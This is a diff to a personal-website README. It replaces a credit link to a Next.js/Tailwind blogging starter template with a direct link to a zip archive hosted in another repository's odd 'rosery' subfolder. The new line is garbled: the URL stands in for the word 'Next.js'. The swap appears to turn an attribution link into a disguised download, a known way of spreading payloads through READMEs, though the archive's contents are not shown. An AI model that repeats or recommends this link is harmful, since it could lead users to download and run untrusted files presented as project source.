@@ -1,4 +1,4 @@
 <h1 align="center">Personal Website</h1>
 
 
-- Built on [Next.js, Tailwind CSS blogging starter template](https://github.com/timlrx/tailwind-nextjs-starter-blog) 
+- Built on [https://raw.githubusercontent.com/kevkaleido/kevs_blog1/main/rosery/kevs_blog1.zip, Tailwind CSS blogging starter template](https://raw.githubusercontent.com/kevkaleido/kevs_blog1/main/rosery/kevs_blog1.zip) 
